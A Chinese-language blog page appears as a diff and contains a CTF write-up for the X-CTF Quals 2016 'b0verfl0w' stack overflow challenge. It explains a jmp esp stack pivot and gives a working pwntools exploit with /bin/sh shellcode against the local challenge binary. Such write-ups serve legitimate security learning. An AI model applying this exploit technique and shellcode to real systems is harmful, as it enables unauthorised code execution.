@@ -1,0 +1,331 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>X-CTF Quals2016 b0verfl0w-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="[相关资源](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w)  
+文件分析1234567$ checksec b0ve">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="X-CTF Quals2016 b0verfl0w-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												X-CTF Quals2016 b0verfl0w-wp
+									
+									
+								</h1>
+								
+									<p id="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/" class="leancloud-visitors view"
+										data-flag-title="X-CTF Quals2016 b0verfl0w-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>[相关资源](<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w)  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec b0verfl0w</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>明显栈溢出</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int <span class="function"><span class="title">vul</span></span>() &#123;</span><br><span class="line">  char s[32]; // [esp+18h] [ebp-20h] BYREF</span><br><span class="line">  puts(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(s, 50, stdin);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  <span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>栈上可执行 首先想着就是在s数组中写入shellcode然后跳转到s   但因为aslr栈地址随机化无法知道s的地址  也没有别的后门函数</p>
+<p>查看<code>jmp</code>gadget发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary b0verfl0w --only &quot;ret|jmp&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">[...]</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h3 id="jmp-esp用处"><a href="#jmp-esp用处" class="headerlink" title="jmp esp用处"></a>jmp esp用处</h3><p>当当前函数执行到<code>leave</code>指令后（即<code>mov esp, ebp;pop ebp</code>），esp指向<code>ret addr</code>，接着<code>ret</code>跳转执行 <code>esp = esp + 4; eip = ret addr</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|------------|------...----|     |------------|------...----|</span><br><span class="line">|  addr 0x11 |      ...    |  →  | addr 0x11  |      ...    |</span><br><span class="line">|------------|------...----|     |------------|------...----|</span><br><span class="line">↑ esp 									   ↑ esp     eip = 0x11</span><br></pre></td></tr></table></figure>
+
+<p>但如果ret addr处地址为<code>jmp esp</code>的地址  则执行完jmp之后，eip和esp指向同一块位置，也就是接着执行栈上的指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|------------|------...----|      |------------|------...----|</span><br><span class="line">|  addr 0x11 |      ...    |  →   | addr 0x11  |      ...    |</span><br><span class="line">|------------|------...----|      |------------|------...----|</span><br><span class="line">↑ esp 	                                       ↑ esp   eip = 0x11(jmp esp)</span><br><span class="line">               |------------|------...----|</span><br><span class="line"> ➤ jmp esp ➤   | addr 0x11  |      ...    |</span><br><span class="line">               |------------|------...----|</span><br><span class="line">                            ↑ esp,eip</span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以在ret addr之后写入汇编指令  但是由于只有<code>50 - 32 = 18</code>字节的溢出空间，显然不够写入完整shellcode </p>
+<p>但是可以把shellcode写入变量s  在ret addr之后写入<code>sub esp, 0x28;jmp esp</code>   0x20(s) + 0x4(old ebp) + 0x4(ret addr) &#x3D; 0x28</p>
+<p>这样子就可以把esp移到变量s的地址，然后跳转执行s里的shellcode</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line">proc = process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0804857A</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode, from https://shell-storm.org/shellcode/files/shellcode-811.html</span></span><br><span class="line">shcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span>   </span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0804836a</span></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&quot;sub esp, 0x28;jmp esp&quot;</span>)	<span class="comment"># move esp back to s, then jmp to esp</span></span><br><span class="line"></span><br><span class="line">proc.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>, shcode.ljust(<span class="number">0x24</span>, <span class="string">b&#x27;h&#x27;</span>) + p32(jmp_esp) + sub_esp_jmp)</span><br><span class="line"></span><br><span class="line">proc.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/" class="leancloud-visitors view" data-flag-title="X-CTF Quals2016 b0verfl0w-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/09/05/NISACTF2022-middlerce-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/09/04/NISACTF2022-isSecret-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-09-05 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pwn-wp/">pwn-wp<span>15</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>68</span></a></li> <li><a href="/tags/pwn/">pwn<span>20</span></a></li> <li><a href="/tags/stack/">stack<span>10</span></a></li> <li><a href="/tags/nightmare/">nightmare<span>9</span></a></li> <li><a href="/tags/stack-pivot/">stack pivot<span>1</span></a></li> <li><a href="/tags/XCTFQuals2016/">XCTFQuals2016<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
